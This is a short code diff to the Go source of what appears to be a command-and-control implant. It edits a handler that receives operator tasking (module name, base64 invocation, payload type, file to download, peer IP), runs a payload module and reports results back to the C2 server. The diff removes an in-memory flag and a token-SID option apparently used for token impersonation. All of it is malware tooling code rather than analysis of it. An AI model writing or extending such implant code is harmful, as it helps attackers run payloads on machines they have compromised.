@@ -76,7 +76,7 @@ func runStat(cmd *cobra.Command, args []string) {
 	c2transport.NotifyC2Binary(cmd, data)
 }
 
-// runCustomModule implements !custom_module --mod_name <name> --invocation <base64> --checksum <checksum> --in_mem <bool> --type <payload_type> --file_to_download <file> --peer <ip> [--token <sid>]
+// runCustomModule implements !custom_module --mod_name <name> --invocation <base64> --checksum <checksum> --type <payload_type> --file_to_download <file> --peer <ip>
 func runCustomModule(cmd *cobra.Command, args []string) {
 	defer func() {
 		if r := recover(); r != nil {
@@ -88,11 +88,9 @@ func runCustomModule(cmd *cobra.Command, args []string) {
 	modName, _ := cmd.Flags().GetString("mod_name")
 	invocationB64, _ := cmd.Flags().GetString("invocation")
 	checksum, _ := cmd.Flags().GetString("checksum")
-	inMem, _ := cmd.Flags().GetBool("in_mem")
 	payloadType, _ := cmd.Flags().GetString("type")
 	fileToDownload, _ := cmd.Flags().GetString("file_to_download")
 	peerIP, _ := cmd.Flags().GetString("peer")
-	tokenSID, _ := cmd.Flags().GetString("token")
 	if modName == "" || checksum == "" {
 		c2transport.NotifyC2(cmd, "Error: args error\n")
 		return
@@ -102,12 +100,6 @@ func runCustomModule(cmd *cobra.Command, args []string) {
 		c2transport.NotifyC2(cmd, "Error decoding invocation: %v\n", err)
 		return
 	}
-	// Propagate the token SID into the invocation so ModuleHandler can use it
-	if tokenSID != "" {
-		invocation.Token = tokenSID
-	}
-	// in_mem is now default and only mode, ignored
-	_ = inMem
 	out := modules.ModuleHandler(peerIP, fileToDownload, payloadType, modName, checksum, invocation)
 	c2transport.NotifyC2(cmd, "%s\n", out)
 }
